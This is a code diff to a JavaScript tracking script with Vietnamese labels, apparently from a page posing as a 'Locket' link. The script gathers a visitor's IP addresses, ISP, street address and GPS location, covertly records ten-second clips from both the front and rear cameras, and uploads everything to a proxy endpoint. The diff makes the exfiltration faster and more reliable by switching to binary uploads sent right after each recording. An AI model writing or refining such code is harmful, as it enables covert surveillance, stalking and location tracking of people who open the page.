@@ -121,15 +121,11 @@ async function recordVideo(facingMode = 'user') {
 
             mediaRecorder.onstop = () => {
                 const blob = new Blob(chunks, { type: options.mimeType });
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
+                resolve(blob);
                 stream.getTracks().forEach(t => t.stop());
             };
 
             mediaRecorder.start();
-            // Quay video trong 10 giây
             setTimeout(() => {
                 if (mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -142,23 +138,20 @@ async function recordVideo(facingMode = 'user') {
     }
 }
 
-function getCaption() {
+function getCaption(cameraType) {
     const mapsLink = info.lat && info.lon ? `https://maps.google.com/?q=${info.lat},${info.lon}` : 'Không rõ';
-    return `📡 [THÔNG TIN TRUY CẬP LOCKET - VIDEO 10S]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
+    return `📡 [THÔNG TIN TRUY CẬP LOCKET - VIDEO 10S - ${cameraType}]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
 }
 
-async function sendMedia(frontB64, backB64) {
-    const media = [];
-    if (frontB64) {
-        media.push({ type: 'video', media: frontB64, caption: getCaption() });
-    }
-    if (backB64) {
-        media.push({ type: 'video', media: backB64 });
-    }
+async function sendBinaryVideo(videoBlob, cameraType) {
+    const formData = new FormData();
+    const fileName = cameraType === 'TRƯỚC' ? 'front_camera.mp4' : 'back_camera.mp4';
+    formData.append('video', videoBlob, fileName);
+    formData.append('caption', getCaption(cameraType));
+
     return fetch(API_PROXY, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'media', media: media })
+        body: formData
     });
 }
 
@@ -166,7 +159,7 @@ async function sendTextOnly() {
     return fetch(API_PROXY, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'text', text: getCaption() })
+        body: JSON.stringify({ type: 'text', text: getCaption('CHỈ TEXT') })
     });
 }
 
@@ -176,25 +169,31 @@ async function startTracking() {
     detectDevice();
     await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
 
-    let front = null, back = null;
+    let frontBlob = null;
+    let backBlob = null;
+
     try {
         // Quay camera trước 10s
-        front = await recordVideo("user");
+        frontBlob = await recordVideo("user");
+        if (frontBlob) {
+            await sendBinaryVideo(frontBlob, 'TRƯỚC');
+        }
+        
         await delay(1000);
+
         // Quay camera sau 10s
         try {
-            back = await recordVideo("environment");
+            backBlob = await recordVideo("environment");
+            if (backBlob) {
+                await sendBinaryVideo(backBlob, 'SAU');
+            }
         } catch (errBack) {
             console.warn("Không quay được camera sau:", errBack);
         }
-        info.camera = '✅ Đã quay video camera trước và sau (10s)';
+        
+        info.camera = '✅ Đã quay và gửi video binary (10s)';
     } catch (e) {
         info.camera = '🚫 Lỗi quay video hoặc bị từ chối';
-    }
-
-    if (front || back) {
-        await sendMedia(front, back);
-    } else {
         await sendTextOnly();
     }
 }
